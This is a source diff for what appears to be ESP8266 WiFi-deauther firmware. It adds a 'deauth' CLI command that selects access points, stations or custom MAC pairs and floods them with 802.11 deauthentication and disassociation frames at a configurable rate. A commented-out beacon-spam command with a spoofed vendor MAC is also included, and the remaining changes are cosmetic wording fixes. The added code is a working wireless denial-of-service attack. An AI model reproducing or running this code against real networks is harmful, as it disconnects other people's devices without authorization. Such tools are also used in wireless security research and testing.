@@ -10,8 +10,11 @@
 
 #include "debug.h"     // debug(), debugln(), debugf()
 #include "scan.h"
+#include "packetinjector.h"
 #include "strh.h"
 #include "StringList.h"
+#include "mac.h"
+#include "Targets.h"
 
 // ram usage
 extern "C" {
@@ -29,22 +32,219 @@ namespace cli {
         cli.setOnError([](cmd_error* e) {
             CommandError cmdError(e); // Create wrapper object
 
-            String res = "ERROR: " + cmdError.toString();
+            debug("ERROR: ");
+            debug(cmdError.toString());
 
             if (cmdError.hasCommand()) {
-                res += "\nDid you mean \"";
-                res += cmdError.getCommand().toString();
-                res += "\"?";
+                debug("\nDid you mean \"");
+                debug(cmdError.getCommand().toString());
+                debug("\"?");
             }
 
-            debugln(res);
+            debugln();
         });
 
         Command cmd_help = cli.addCommand("help", [](cmd* c) {
             debugln(cli.toString());
         });
-        cmd_help.setDescription("  Prints the list of commands that you see right now");
+        cmd_help.setDescription("  Print the list of commands that you see right now");
 
+        Command cmd_deauth = cli.addCommand("deauth", [](cmd* c) {
+            Command cmd(c);
+
+            TargetList targets;
+
+            { // Read Access Point MACs
+                String ap_str = cmd.getArg("ap").getValue();
+                StringList list(ap_str, ",");
+
+                while (list.available()) {
+                    ap_t* ap = scan::getAP(list.iterate().toInt());
+                    if (ap) {
+                        targets.push(ap->bssid, mac::BROADCAST, ap->ch);
+                    }
+                }
+            }
+
+            { // Read Station MACs
+                String st_str = cmd.getArg("st").getValue();
+                StringList list(st_str, ",");
+
+                while (list.available()) {
+                    station_t* st = scan::getStation(list.iterate().toInt());
+                    if (st && st->ap) {
+                        targets.push(st->ap->bssid, st->mac, st->ap->ch);
+                    }
+                }
+            }
+
+            { // Read custom MACs
+                String mac_str = cmd.getArg("mac").getValue();
+
+                StringList target_list(mac_str, ",");
+
+                while (target_list.available()) {
+                    String target = target_list.iterate();
+                    StringList target_data(target, "-");
+
+                    if (target_data.size() != 3) continue;
+
+                    String mac_from_str = target_data.iterate();
+                    String mac_to_str   = target_data.iterate();
+                    String ch_str       = target_data.iterate();
+
+                    uint8_t mac_from[6];
+                    uint8_t mac_to[6];
+                    uint8_t ch;
+
+                    mac::fromStr(mac_from_str.c_str(), mac_from);
+                    mac::fromStr(mac_to_str.c_str(), mac_to);
+                    ch = ch_str.toInt();
+
+                    targets.push(mac_from, mac_to, ch);
+                }
+            }
+
+            // Check MAC list
+            if (targets.size() == 0) {
+                debugln("ERROR: No targets selected");
+                return;
+            }
+
+            // Time
+            String timeout_str           = cmd.getArg("t").getValue();
+            unsigned long attack_timeout = timeout_str.toInt() * 1000;
+
+            // Number
+            unsigned long max_pkts = cmd.getArg("n").getValue().toInt();
+
+            // Rate
+            unsigned long pkt_rate = cmd.getArg("r").getValue().toInt();
+
+            // Mode
+            String mode = cmd.getArg("m").getValue();
+
+            bool deauth   = false;
+            bool disassoc = false;
+
+            if (mode == "deauth+disassoc") {
+                debugln("Deauthing and disassociating target(s)");
+                deauth   = true;
+                disassoc = true;
+            } else if (mode == "deauth") {
+                debugln("Deauthing target(s)");
+                deauth = true;
+            } else if (mode == "disassoc") {
+                debugln("Disassociating target(s)");
+                disassoc = true;
+            } else {
+                debugln("ERROR: Invalid mode");
+                return;
+            }
+
+            unsigned long start_time  = millis();
+            unsigned long output_time = millis();
+
+            unsigned long pkts_sent       = 0;
+            unsigned long pkts_per_second = 0;
+            unsigned long pkt_time        = 0;
+            unsigned long pkt_interval    = (1000/pkt_rate) * (deauth+disassoc);
+
+            { // DEBUG
+                if (attack_timeout > 0) {
+                    debug("Stop after ");
+                    debug(timeout_str);
+                    debugln(" seconds");
+                }
+
+                if (max_pkts > 0) {
+                    debug("Send ");
+                    debug(max_pkts);
+                    debugln(" packets");
+                }
+
+                debug("Targets ");
+                debugln(targets.size());
+
+                // Print MACs
+                targets.begin();
+
+                while (targets.available()) {
+                    Target t = targets.iterate();
+                    debug(strh::mac(t.from()));
+                    debug(" ");
+                    debug(strh::mac(t.to()));
+                    debug(" ");
+                    debugln(t.ch());
+                }
+            }
+
+            bool running = true;
+
+            while (running) {
+                targets.begin();
+
+                while (running && targets.available()) {
+                    if (millis() - pkt_time >= pkt_interval) {
+                        Target t = targets.iterate();
+
+                        if (deauth) pkts_per_second += packetinjector::deauth(t.ch(), t.from(), t.to());
+                        if (disassoc) pkts_per_second += packetinjector::disassoc(t.ch(), t.from(), t.to());
+
+                        pkt_time = millis();
+                    }
+                    if (millis() - output_time >= 1000) {
+                        pkts_sent += pkts_per_second;
+
+                        debug(pkts_sent);
+                        debug(" packets sent - ");
+                        debug(pkts_per_second);
+                        debug("/");
+                        debug(pkt_rate);
+                        debugln(" pkts/s");
+
+                        output_time = millis();
+
+                        pkts_per_second = 0;
+                    }
+                    running = !(read_exit()
+                                || (attack_timeout > 0 && millis() - start_time > attack_timeout)
+                                || (max_pkts > 0 && pkts_sent > max_pkts));
+                }
+            }
+        });
+        cmd_deauth.addArg("m/ode", "deauth+disassoc");
+        cmd_deauth.addArg("ap", "");
+        cmd_deauth.addArg("st/ation", "");
+        cmd_deauth.addArg("mac", "");
+        cmd_deauth.addArg("t/ime/out", "300");
+        cmd_deauth.addArg("n/umber", "0");
+        cmd_deauth.addArg("r/ate", "20");
+        cmd_deauth.setDescription("");
+        // -ap <...>: Select AP(s) to attack
+        // -st/ation <...>: Select Station(s) to attack
+        // -mac <...>: 00:11:22:33:44:55-ff:ff:ff:ff:ff:ff,...
+        // -t/ime <seconds>: Max time until attack ends (default: 5min)
+        // -n/umber <number of frames>: Max packets until attack ends (0=no limit, default: 0)
+        // -r/ate <packet rate>: packets per second
+        // -m/ode <deauth,disassoc,deauth+disassoc>
+
+        /*
+           cli.addCommand("beacon", [](cmd* c) {
+            uint8_t from[]   = { 0xc8, 0x00, 0x84, 0x2e, 0x11, 0x39 }; // Cisco
+            const char* ssid = "Hello World!";
+            uint8_t ch       = 11;
+
+            for (int j = 0; j<10; j++) {
+                for (int i = 0; i<10; i++) {
+                    packetinjector::beacon(ch, from, ssid, false);
+                    delay(100);
+                    debug('.');
+                }
+                debugln();
+            }
+           });
+         */
         Command cmd_start = cli.addCommand("start", [](cmd* c) {
             String res;
             String cmd;
@@ -54,7 +254,7 @@ namespace cli {
             // Command
             while (!(res == "scan")) {
                 debugln("What can I do for you today?\n"
-                        "Remember that you can always ecape by typing 'exit'\n"
+                        "Remember that you can always escape by typing 'exit'\n"
                         "  scan: Search for WiFi networks and clients");
                 res = read_and_wait();
                 if (res == "exit") {
@@ -137,7 +337,7 @@ namespace cli {
                 debugln();
             }
         });
-        cmd_clear.setDescription("  Clears serial output (by spamming line breaks :P)");
+        cmd_clear.setDescription("  Clear serial output (by spamming line breaks :P)");
 
         Command cmd_ram = cli.addCommand("ram", [](cmd* c) {
             debug("Size: ");
@@ -156,7 +356,7 @@ namespace cli {
             debug(system_get_free_heap_size() / (81920 / 100));
             debugln("%)");
         });
-        cmd_ram.setDescription("  Prints memory usage");
+        cmd_ram.setDescription("  Print memory usage");
 
         Command cmd_scan = cli.addCommand("scan", [](cmd* c) {
             Command cmd(c);
@@ -221,7 +421,7 @@ namespace cli {
         Command cmd_results = cli.addCommand("results", [](cmd* c) {
             scan::printResults();
         });
-        cmd_results.setDescription("  Prints list of scan results [access points (networks) and stations (clients)]");
+        cmd_results.setDescription("  Print list of scan results [access points (networks) and stations (clients)]");
     }
 
     void parse(const char* input) {
